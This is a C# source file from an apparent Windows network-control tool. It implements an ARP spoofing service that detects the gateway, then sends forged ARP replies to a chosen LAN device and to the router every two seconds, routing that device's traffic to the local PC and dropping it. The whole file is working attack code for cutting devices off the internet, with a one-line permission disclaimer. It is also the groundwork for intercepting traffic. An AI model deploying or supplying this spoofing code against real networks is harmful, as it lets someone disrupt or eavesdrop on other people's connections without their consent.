using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace WinNetControl.Core;

/// <summary>
/// ARP spoofing / ARP poisoning service.
/// Sends periodic forged ARP reply packets claiming this PC's MAC is the router,
/// and that this PC's MAC is the target — so the device's internet traffic routes
/// through this PC and is silently dropped (internet cut-off).
/// 
/// Requires Npcap to be installed (https://npcap.com/).
/// Only use on networks you own or have permission to control.
/// </summary>
public sealed class ArpSpoofService : IDisposable
{
    // ── State ──────────────────────────────────────────────────────────────────
    private readonly ConcurrentDictionary<string, CancellationTokenSource> _active = new();
    private LibPcapLiveDevice? _dev;
    private PhysicalAddress _ourMac     = PhysicalAddress.None;
    private IPAddress       _ourIp      = IPAddress.None;
    private IPAddress       _gatewayIp  = IPAddress.None;
    private PhysicalAddress _gatewayMac = PhysicalAddress.None;
    private bool            _initialized;
    private bool            _disposed;

    public bool   IsAvailable { get; private set; }
    public string InitError   { get; private set; } = string.Empty;
    public int    ActiveCount  => _active.Count;
    public string GatewayIp   => _gatewayIp.ToString();
    public string OurIp       => _ourIp.ToString();

    // ── Initialization ────────────────────────────────────────────────────────
    /// <summary>
    /// Detects the active NIC, our IP/MAC, and gateway IP/MAC.
    /// Must be called before StartSpoofing.
    /// </summary>
    public bool Initialize()
    {
        if (_initialized) return IsAvailable;
        _initialized = true;

        try
        {
            // Verify Npcap/WinPcap is available
            _ = Pcap.SharpPcapVersion;

            // Pick the best NIC: operational, non-loopback, has an IPv4 gateway
            var iface = NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(n =>
                n.OperationalStatus == OperationalStatus.Up &&
                n.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                n.GetIPProperties().GatewayAddresses
                    .Any(g => g.Address.AddressFamily == AddressFamily.InterNetwork));

            if (iface == null)
            {
                InitError = "No active network interface with a gateway found.";
                return false;
            }

            var unicast = iface.GetIPProperties().UnicastAddresses
                .FirstOrDefault(a => a.Address.AddressFamily == AddressFamily.InterNetwork);
            if (unicast == null) { InitError = "Cannot determine local IPv4 address."; return false; }

            _ourIp  = unicast.Address;
            _ourMac = iface.GetPhysicalAddress();

            var gw = iface.GetIPProperties().GatewayAddresses
                .First(g => g.Address.AddressFamily == AddressFamily.InterNetwork);
            _gatewayIp = gw.Address;

            // Resolve gateway MAC — ping it first to warm up the ARP cache
            using (var ping = new Ping()) ping.Send(_gatewayIp.ToString(), 1000);
            Thread.Sleep(300);
            _gatewayMac = ResolveArpMac(_gatewayIp.ToString()) ?? PhysicalAddress.None;

            if (_gatewayMac.Equals(PhysicalAddress.None))
            {
                InitError = $"Cannot resolve gateway MAC for {_gatewayIp}. " +
                            "Make sure the gateway is reachable.";
                return false;
            }

            // Match SharpPcap device to our NIC by IP address
            var captureDevices = CaptureDeviceList.Instance;
            _dev = captureDevices.OfType<LibPcapLiveDevice>().FirstOrDefault(d =>
            {
                try { return d.Addresses.Any(a => _ourIp.Equals(a.Addr?.ipAddress)); }
                catch { return false; }
            })
            // Fallback: first non-loopback LibPcap device
            ?? captureDevices.OfType<LibPcapLiveDevice>()
                .FirstOrDefault(d => !d.Name.Contains("lo") && !d.Name.Contains("Loopback"));

            if (_dev == null)
            {
                InitError = "No suitable capture device found. Is Npcap installed?";
                return false;
            }

            IsAvailable = true;
            return true;
        }
        catch (DllNotFoundException ex)
        {
            InitError = "Npcap not found. Install from https://npcap.com/ — " + ex.Message;
            return false;
        }
        catch (Exception ex)
        {
            InitError = "ARP spoof init failed: " + ex.Message;
            return false;
        }
    }

    // ── Public API ────────────────────────────────────────────────────────────
    /// <summary>
    /// Starts ARP poisoning for <paramref name="targetIp"/>.
    /// The device loses internet access because its traffic is redirected to this PC,
    /// which does not forward it (Windows IP forwarding is off by default).
    /// </summary>
    /// <param name="targetIp">IP address of the LAN device to cut off.</param>
    /// <param name="targetMacStr">MAC address string for the device (e.g. "AA-BB-CC-DD-EE-FF").</param>
    /// <returns>true if spoofing started; false on error.</returns>
    public bool StartSpoofing(string targetIp, string targetMacStr)
    {
        if (!IsAvailable && !Initialize()) return false;
        if (_active.ContainsKey(targetIp)) return true; // already running

        var targetMac = ParseMac(targetMacStr);
        if (targetMac == null) return false;

        var cts = new CancellationTokenSource();
        if (!_active.TryAdd(targetIp, cts)) return true;

        _ = Task.Run(() => SpoofLoopAsync(targetIp, targetMac, cts.Token));
        return true;
    }

    /// <summary>
    /// Stops ARP poisoning and sends several corrective ARP replies
    /// so the device and gateway restore their real MAC mappings quickly.
    /// </summary>
    public void StopSpoofing(string targetIp, string targetMacStr)
    {
        if (!_active.TryRemove(targetIp, out var cts)) return;
        cts.Cancel();

        // Send corrective (gratuitous) ARP to restore real MACs
        var targetMac = ParseMac(targetMacStr);
        if (targetMac != null && _dev != null && IsAvailable)
        {
            try
            {
                OpenDeviceIfNeeded();
                var tgtIp = IPAddress.Parse(targetIp);
                for (int i = 0; i < 6; i++)
                {
                    // Tell target: gateway is really at _gatewayMac
                    SendArpReply(_gatewayMac, _gatewayIp, targetMac, tgtIp);
                    // Tell gateway: target is really at targetMac
                    SendArpReply(targetMac, tgtIp, _gatewayMac, _gatewayIp);
                    Thread.Sleep(80);
                }
            }
            catch { /* best-effort */ }
        }
        cts.Dispose();
    }

    /// <summary>Stops all active spoof sessions (does NOT send corrective ARP).</summary>
    public void StopAll()
    {
        foreach (var ip in _active.Keys.ToArray())
        {
            if (_active.TryRemove(ip, out var cts))
            {
                cts.Cancel();
                cts.Dispose();
            }
        }
    }

    public bool IsActive(string targetIp) => _active.ContainsKey(targetIp);

    // ── Spoof Loop ────────────────────────────────────────────────────────────
    private async Task SpoofLoopAsync(string targetIp, PhysicalAddress targetMac, CancellationToken ct)
    {
        if (_dev == null) return;
        try
        {
            OpenDeviceIfNeeded();
            var tgtIp = IPAddress.Parse(targetIp);

            while (!ct.IsCancellationRequested)
            {
                // Poison target: "The gateway is at MY MAC"
                SendArpReply(_ourMac, _gatewayIp, targetMac, tgtIp);
                // Poison gateway: "The target is at MY MAC"
                SendArpReply(_ourMac, tgtIp, _gatewayMac, _gatewayIp);

                await Task.Delay(2000, ct);
            }
        }
        catch (OperationCanceledException) { }
        catch { }
    }

    // ── Packet Building ───────────────────────────────────────────────────────
    private void SendArpReply(
        PhysicalAddress senderMac, IPAddress senderIp,
        PhysicalAddress targetMac, IPAddress targetIp)
    {
        if (_dev == null) return;
        var arp = new ArpPacket(
            ArpOperation.Response,
            targetMac,  targetIp,
            senderMac,  senderIp);

        var eth = new EthernetPacket(senderMac, targetMac, EthernetType.Arp);
        eth.PayloadPacket = arp;

        _dev.SendPacket(eth);
    }

    private void OpenDeviceIfNeeded()
    {
        if (_dev == null) return;
        try
        {
            if (!_dev.Opened)
                _dev.Open(new DeviceConfiguration
                {
                    Mode        = DeviceModes.Promiscuous,
                    ReadTimeout = 1000
                });
        }
        catch { /* already open or driver error — ignore */ }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────
    /// <summary>Reads MAC from the Windows ARP cache for a given IP.</summary>
    public static PhysicalAddress? ResolveArpMac(string ip)
    {
        try
        {
            var psi = new ProcessStartInfo("arp", $"-a {ip}")
            {
                RedirectStandardOutput = true,
                UseShellExecute        = false,
                CreateNoWindow         = true
            };
            using var proc = Process.Start(psi)!;
            string output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();
            var match = Regex.Match(output, @"([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}");
            if (!match.Success) return null;
            return PhysicalAddress.Parse(match.Value.Replace(':', '-').ToUpper());
        }
        catch { return null; }
    }

    private static PhysicalAddress? ParseMac(string mac)
    {
        if (string.IsNullOrWhiteSpace(mac) || mac == "—") return null;
        try
        {
            string norm = mac.Replace(':', '-').ToUpper();
            return PhysicalAddress.Parse(norm);
        }
        catch { return null; }
    }

    // ── IDisposable ───────────────────────────────────────────────────────────
    public void Dispose()
    {
        if (_disposed) return;
        _disposed = true;
        StopAll();
        try { _dev?.Close(); } catch { }
    }
}
